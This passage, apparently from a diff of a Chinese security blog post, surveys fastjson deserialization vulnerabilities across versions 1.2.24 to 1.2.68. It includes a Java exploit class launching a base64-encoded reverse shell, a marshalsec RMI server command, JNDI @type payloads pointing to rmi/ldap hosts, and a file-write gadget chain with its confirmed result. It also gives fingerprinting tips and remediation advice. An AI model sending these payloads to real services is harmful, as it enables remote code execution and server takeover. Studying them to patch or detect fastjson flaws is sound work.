class=&quot;hljs-string&quot;&gt;&quot;bash -c &#123;echo,[反弹shell命令的base64形式]&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&lt;/span&gt;);</span><br><span class="line">    &#125;&lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt;(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(String[] argv)&lt;/span&gt;&lt;/span&gt;&#123;</span><br><span class="line">    Exploit e = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Exploit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>2、外网服务器执行以下命令监听一个RMIServer：</p>
+<p><code>java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://x.x.x.x:8081/#Exploit 8082</code><br>3、目标站点发送payload。</p>
+<h5 id="修复方法-2"><a href="#修复方法-2" class="headerlink" title="修复方法"></a>修复方法</h5><p>1、在不影响业务的情况下，关闭AutoType。由于Fastjson的AutoType默认是关闭，相关用户自查是否使用ParseConfig.getGlobalInstance().setAutoTypeSupport(true);开启了AutoType。<br>2、WAF拦截Json请求中的多种编码形式的‘@type’，‘\u0040type’等字样；<br>3、确认 fastjson 版本为最新版本，同时确认升级JDK版本到8u121，7u13，6u141以上。</p>
+<h4 id="2-4-fastjson-1-2-62-1-2-68"><a href="#2-4-fastjson-1-2-62-1-2-68" class="headerlink" title="2.4 fastjson 1.2.62 - 1.2.68"></a>2.4 fastjson 1.2.62 - 1.2.68</h4><p>fastjson1.2.68及之前版本的autotype关闭的情况下仍然可以绕过限制反序列化，相比 1.2.47 版本的漏洞来讲这个版本的漏洞还是有一些限制的，例如 1.2.47 是可以绕过黑名单的限制的，而fastjson1.2.68则无法绕过黑名单，并且需要类实现AutoCloseable接口。目前主要的JNDI gadget 已经进了黑名单，还不允许反序列化类实现了 ClassLoader、DataSource、RowSet接口，这就导致了绝大部分的JNDI gadget 无法利用，于是有些师傅通过新的Gadgets绕过autoType开关，在autoType关闭的情况下仍然可以绕过黑白名单防御机制，通过反序列化漏洞在服务器上执行任意代码。</p>
+<h5 id="检测poc-3"><a href="#检测poc-3" class="headerlink" title="检测poc"></a>检测poc</h5><p>1 适用于&lt;=1.2.62(特定库):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi://127.0.0.1:1098/exploit&quot;&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p>2 适用于&lt;=1.2.66（(特定库和autoTypeSupport属性为true）:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap://192.168.80.1:1399/Calc&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>3 适用于&lt;=1.2.68：<br>向指定文件写任意内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo -ne &quot;safetest&quot; | openssl zlib | base64 -w 0</span><br><span class="line">eJwrTkxLLUktLgEADv0DYA==</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><a href="https://securitygrind.com/building-openssl-with-zlib-support/" target="_blank" rel="noopener">启用openssl的zlib支持</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo -ne &quot;safetest&quot; | openssl zlib | wc -c</span><br><span class="line">16</span><br></pre></td></tr></table></figure>
+<p>依赖原生JDK11：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &apos;@type&apos;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">    &apos;@type&apos;:&apos;sun.rmi.server.MarshalOutputStream&apos;,</span><br><span class="line">    &apos;out&apos;:</span><br><span class="line">    &#123;</span><br><span class="line">        &apos;@type&apos;:&apos;java.util.zip.InflaterOutputStream&apos;,</span><br><span class="line">        &apos;out&apos;:</span><br><span class="line">        &#123;</span><br><span class="line">           &apos;@type&apos;:&apos;java.io.FileOutputStream&apos;,</span><br><span class="line">           &apos;file&apos;:&apos;/tmp/test.txt&apos;,</span><br><span class="line">           &apos;append&apos;:false</span><br><span class="line">        &#125;,</span><br><span class="line">        &apos;infl&apos;:</span><br><span class="line">        &#123;</span><br><span class="line">            &apos;input&apos;:</span><br><span class="line">            &#123;</span><br><span class="line">                &apos;array&apos;:&apos;eJwrTkxLLUktLgEADv0DYA==&apos;,</span><br><span class="line">                &apos;limit&apos;:16</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &apos;bufLen&apos;:1048576</span><br><span class="line">    &#125;,</span><br><span class="line">    &apos;protocolVersion&apos;:1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>依赖原生JDK8/JDK10：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &apos;@type&apos;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">    &apos;@type&apos;:&apos;sun.rmi.server.MarshalOutputStream&apos;,</span><br><span class="line">    &apos;out&apos;:</span><br><span class="line">    &#123;</span><br><span class="line">        &apos;@type&apos;:&apos;java.util.zip.InflaterOutputStream&apos;,</span><br><span class="line">        &apos;out&apos;:</span><br><span class="line">        &#123;</span><br><span class="line">           &apos;@type&apos;:&apos;java.io.FileOutputStream&apos;,</span><br><span class="line">           &apos;file&apos;:&apos;/tmp/test.txt&apos;,</span><br><span class="line">           &apos;append&apos;:false</span><br><span class="line">        &#125;,</span><br><span class="line">        &apos;infl&apos;:</span><br><span class="line">        &#123;</span><br><span class="line">            &apos;input&apos;:&apos;eJwrTkxLLUktLgEADv0DYA==&apos;</span><br><span class="line">        &#125;,</span><br><span class="line">        &apos;bufLen&apos;:1048576</span><br><span class="line">    &#125;,</span><br><span class="line">    &apos;protocolVersion&apos;:1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>提交数据包后查看受害机器,可以看到成功创建/tmp/test.txt文件并且其内容为写入的safetest。 </p>
+<h5 id="修复方法-3"><a href="#修复方法-3" class="headerlink" title="修复方法"></a>修复方法</h5><p>1、升级至安全版本 较低版本升级至最新版本 1.2.69 可能会出现兼容性问题，建议升级至特定版本的sec10 bugfix版本，请参考以下链接尽快修复： <a href="https://repo1.maven.org/maven2/com/alibaba/fastjson/" target="_blank" rel="noopener">https://repo1.maven.org/maven2/com/alibaba/fastjson/</a><br>2、开启 SafeMode 若无法立即升级版本，可通过开启 SafeMode 来缓解此漏洞。fastjson在1.2.68 及之后的版本中引入了SafeMode，配置SafeMode 后，无论白名单和黑名单，都不支持 autoType，可一定程度上缓解反序列化Gadgets类变种攻击。以下为配置SafeMode的三种方式:<br>1） 在代码中配置 ParserConfig.getGlobalInstance().setSafeMode(true);<br>2）加上JVM启动参数 -Dfastjson.parser.safeMode=true 如果有多个包名前缀，用逗号隔开<br>3）通过 fastjson.properties文件配置 通过类路径的 fastjson.properties 文件来配置，配置方式如下： fastjson.parser.safeMode=true 参考链接如下： <a href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/wiki/fastjson_safemode</a><br>3、采用其他json处理组件替换，jackson-databind漏洞也频发，建议使用Gson</p>
+<h3 id="3、fastjson渗透测试技巧"><a href="#3、fastjson渗透测试技巧" class="headerlink" title="3、fastjson渗透测试技巧"></a>3、fastjson渗透测试技巧</h3><h4 id="3-1-获取-fastjson-精确版本号的方法（-lt-fastjson-1-2-73）"><a href="#3-1-获取-fastjson-精确版本号的方法（-lt-fastjson-1-2-73）" class="headerlink" title="3.1 获取 fastjson 精确版本号的方法（&lt;= fastjson 1.2.73）"></a>3.1 获取 fastjson 精确版本号的方法（&lt;= fastjson 1.2.73）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;@type&apos;:&quot;java.lang.AutoCloseable&quot;</span><br></pre></td></tr></table></figure>
+<p>可以直接在异常信息中暴露出 fastjson 的精确版本，然后再根据版本去测试已知漏洞。<br><img src="https://img-blog.csdnimg.cn/20201221175943816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoeXN0YXJ0cmVl,size_16,color_FFFFFF,t_70" alt=""></p>
+<h4 id="3-2-fastjson判断特征"><a href="#3-2-fastjson判断特征" class="headerlink" title="3.2 fastjson判断特征"></a>3.2 fastjson判断特征</h4><p>1、确定传入的get或者post参数，是否为json格式<br>2、返回HTTP 500，且关键字为fastjson或jackson，可证明为fastjson或jackson<br>3、仅返回HTTP 500，没有任何报错，结合dnslog、端口访问、返回延迟等综合判断，</p>
+<ul>
+<li>如果dnslog返回有记录可证明可利用，</li>
+<li>如果访问不存在的主机及端口，返回包是否有延迟，如果有延迟，判断可能存在。</li>
+<li>在确定可以利用的情况下，尝试是否通公网，不通公网尝试直接可执行命令的rce。</li>
+</ul>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本文从fastjson 1.2.24开始，汇总了每个有反序列化漏洞的版本poc、rce和修复方案，可以发现每个反序列漏洞都跟fastjson中的AutoType特性有关，从绕过fastjson v1.2.41的checkAutotype到fastjson v1.2.68的expectClass，每次新版本反序列漏洞的产生都是黑客与fastjson的博弈。</p>
+<blockquote>
+<p>参考链接：<br><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">fastjson 远程反序列化poc的构造和分析</a><br><a href="https://mp.weixin.qq.com/s?src=11&amp;timestamp=1608260787&amp;ver=2773&amp;signature=ZpRsuFkF8wIVAN2x*2uV1BKZQ7Dk9DPwMrpniVv2KnEOBhTmWdm0L9CTAafkL1eWAEL1DvilbByMfFPKDUtJD2f*HkCUhLlWFMfkWJOpbkJW0iOkdh4Acy*AGh9mzM5u&amp;new=1" target="_blank" rel="noopener">Fastjson1.2.47反序列化漏洞复现</a><br><a href="https://wemp.app/posts/d6f05c8e-544e-4919-b835-e355a61f01dd" target="_blank" rel="noopener">寻找Fastjson 1.2.68 AutoCloseable利用链</a><br><a href="https://paper.seebug.org/1236/" target="_blank" rel="noopener">浅谈下 Fastjson 的 autotype 绕过</a><br><a href="https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/" target="_blank" rel="noopener">红队武器库!fastjson小于1.2.68全漏洞RCE利用exp</a><br><a href="https://zhuanlan.zhihu.com/p/157211675?from_voters_page=true" target="_blank" rel="noopener">fastjson到底做错了什么？</a></p>
+</blockquote>
+
+      
+
+
+
+      
+
+  <div class="declare">
+  <br><br>
+  <strong>本文链接：</strong>
+  http://dayun.shystartree.online/2020/10/22/fastjson反序列化漏洞史/
+  <br>
+  <strong>版权声明：</strong>本博客所有文章除特别声明外，均采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a><a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="/img/licensee.png"/></a>许可协议。欢迎转载，但转载请注明来自qingyu’s blog，并保持转载后文章内容的完整，本人保留所有版权相关权利。
+  
+  
+  </div>
+
+
+
+
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>觉得写得好可以请我吃杯奶茶支持下哦～～～<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/wxpay.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随记</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">fastjson</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">反序列化</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://dayun.shystartree.online/2020/10/22/fastjson反序列化漏洞史/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2020/04/15/burpsuite信息收集插件logger++使用方法/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">使用burpsuite插件logger++进行信息收集</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、fastjson简介"><span class="toc-number">1.</span> <span class="toc-text">1、fastjson简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、fastjson反序列化漏洞版本线"><span class="toc-number">2.</span> <span class="toc-text">2、fastjson反序列化漏洞版本线</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-fastjson-v0-1-2-24"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 fastjson v0 - 1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#检测poc"><span class="toc-number">2.1.1.</span> <span class="toc-text">检测poc</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RCE"><span class="toc-number">2.2.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#修复方法"><span class="toc-number">2.2.1.</span> <span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-fastjson-1-2-25-1-2-47"><span class="toc-number">2.3.</span> <span class="toc-text">2.2 fastjson 1.2.25 - 1.2.47</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#检测poc-1"><span class="toc-number">2.4.</span> <span class="toc-text">检测poc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RCE-1"><span class="toc-number">2.5.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#修复方法-1"><span class="toc-number">2.5.1.</span> <span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-fastjson-1-2-48-1-2-61"><span class="toc-number">2.6.</span> <span class="toc-text">2.3 fastjson 1.2.48 - 1.2.61</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#检测poc-2"><span class="toc-number">2.6.1.</span> <span class="toc-text">检测poc</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RCE-2"><span class="toc-number">2.6.2.</span> <span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#修复方法-2"><span class="toc-number">2.6.3.</span> <span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-fastjson-1-2-62-1-2-68"><span class="toc-number">2.7.</span> <span class="toc-text">2.4 fastjson 1.2.62 - 1.2.68</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#检测poc-3"><span class="toc-number">2.7.1.</span> <span class="toc-text">检测poc</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#修复方法-3"><span class="toc-number">2.7.2.</span> <span class="toc-text">修复方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、fastjson渗透测试技巧"><span class="toc-number">3.</span> <span class="toc-text">3、fastjson渗透测试技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-获取-fastjson-精确版本号的方法（-lt-fastjson-1-2-73）"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 获取 fastjson 精确版本号的方法（&lt;= fastjson 1.2.73）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-fastjson判断特征"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 fastjson判断特征</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '#vcomment',
+            notify: notify,
+            verify: verify,
+            app_id: "cPIja8hEdmK0DO1mNhmKUtdb-gzGzoHsz",
+            app_key: "rAG7JWw8FX9LqnHJj0NTvGdW",
+            placeholder: "兄弟姐妹们，别默默地路过，吐槽下嘛～～～",
+            avatar:"identicon"
+        });
+    }
+</script>
+
+    </section>
+  
+
+  
+
+  
 
 
           </div>
@@ -249,9 +560,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
